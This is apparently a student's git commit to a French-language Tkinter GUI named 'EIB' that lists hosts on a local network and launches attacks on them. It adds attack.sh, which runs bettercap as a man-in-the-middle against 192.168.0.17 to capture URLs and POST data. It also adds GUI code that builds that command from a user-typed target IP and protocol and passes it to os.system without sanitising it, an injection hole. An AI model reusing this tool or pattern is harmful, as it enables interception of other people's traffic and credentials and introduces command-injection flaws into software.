1f74e7318f12ad9cf791d03d49eaefa016da330f
AlexisCangelosi <cangelosi.alexis@gmail.com>
2016-06-09 02:11:05 +0200

    mise a jour interface + visualisation des flux

---
+++ script/version2/attack.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+
+sudo bettercap -X -T 192.168.0.17 --proxy -P URL,POST
--- script/version2/master.py
+++ script/version2/master.py
@@ -6,7 +6,9 @@
 from tkinter import *
 from tkinter import ttk
 from tkinter import filedialog
+import subprocess as sub
 import netifaces as nf
+import time
 import sys
 import os
 
@@ -15,6 +17,7 @@ import os
 def NewFile():
     main.set("")
     attack.set("")
+
 def List_user_auto():
 	os.system('rm scan_list')
 	os.system('rm interfaces')
@@ -28,8 +31,32 @@ def List_user_man():
 	file = open('scan_list', 'r')
 	main.set(file.read())
 	file.close()
-def Attack_user():
-	attack.set("coucou tu es attaquer :)")
+def Print_attack_user():
+	flux = ["HTTP","FTP","MAIL"]
+
+	ttk.Label(mainframe, text="Machine à attaquer : ").grid(row=3,column=1)
+	ttk.Entry(mainframe, width=20, textvariable=ip).grid(row=3, column=2)
+	ttk.Label(mainframe, text="Flux ciblé : ").grid(row=4,column=1)
+	ttk.Label(mainframe, textvariable=flux).grid(row=4,column=2)
+	ttk.Entry(mainframe, textvariable=flux_choix).grid(row=4,column=3)
+	ttk.Button(mainframe, text="Attack !", command=Attack_user).grid(row=3,column=3)
+
+def Attack_user(*args):
+	os.system("echo '' > attack.sh")
+
+	value = str(ip.get())
+	value2 = str(flux_choix.get())
+
+	if value2 == "HTTP":
+		value2 = "URL,POST"
+	else :
+		value2 = value2
+
+	string_attack = "#!/bin/sh\n\nsudo bettercap -X -T " + value + " --proxy -P " + value2
+
+	os.system('echo "' + string_attack + '" > attack.sh')
+	os.system("python tkinter-read-async-subprocess-output.py")
+	
 def About():
     main.set("This is a simple example of a menu")
 
@@ -40,11 +67,20 @@ def About():
 root = Tk()
 root.title("EIB")
 root.geometry("1280x800")
+mainframe = ttk.Frame(root, padding="3 3 12 12")
+mainframe.grid(column=0, row=0, sticky=(N, W, E, S))
+mainframe.columnconfigure(0, weight=2)
+mainframe.rowconfigure(0, weight=2)
 menu = Menu(root)
 root.config(menu=menu)
 
 main = StringVar()
 attack = StringVar()
+ip = StringVar()
+flux_choix = StringVar()
+
+
+# ----- MENU ----- #
 
 filemenu = Menu(menu)
 menu.add_cascade(label="File", menu=filemenu)
@@ -56,19 +92,20 @@ actionmenu = Menu(menu)
 menu.add_cascade(label="Action", menu=actionmenu)
 actionmenu.add_command(label="List network auto", command=List_user_auto)
 actionmenu.add_command(label="List network manuel", command=List_user_man)
-actionmenu.add_command(label="Attack user", command=Attack_user)
-
-
+actionmenu.add_command(label="Attack user", command=Print_attack_user)
 
 helpmenu = Menu(menu)
 menu.add_cascade(label="Help", menu=helpmenu)
 helpmenu.add_command(label="About...", command=About)
 
-fichier_open = ttk.Label(root, textvariable=main)
-fichier_open.pack()
-print_attack = ttk.Label(root, textvariable=attack)
-print_attack.pack()
+# ----- AFFICHAGE ----- #
 
+ttk.Label(mainframe, textvariable=main).grid(row=1, column=2)
+ttk.Label(mainframe, textvariable=attack).grid(row=2, column=2)
+
+	
+
+# ----- FIN INTERFACE ---- #
 
 mainloop()
 
